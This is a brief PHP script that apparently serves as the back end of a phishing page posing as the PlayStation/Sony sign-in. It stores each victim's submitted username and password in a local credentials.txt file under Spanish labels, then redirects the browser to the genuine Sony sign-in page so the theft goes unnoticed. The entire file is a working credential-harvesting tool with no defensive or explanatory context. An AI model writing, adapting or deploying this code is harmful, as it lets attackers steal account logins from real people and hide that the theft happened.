<?php

file_put_contents("credentials.txt", "[+] Playstation -> Usuario: " . $_POST['username'] . " Contraseña: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://id.sonyentertainmentnetwork.com/signin/?#/signin?entry=%2Fsignin/');
exit();
?>
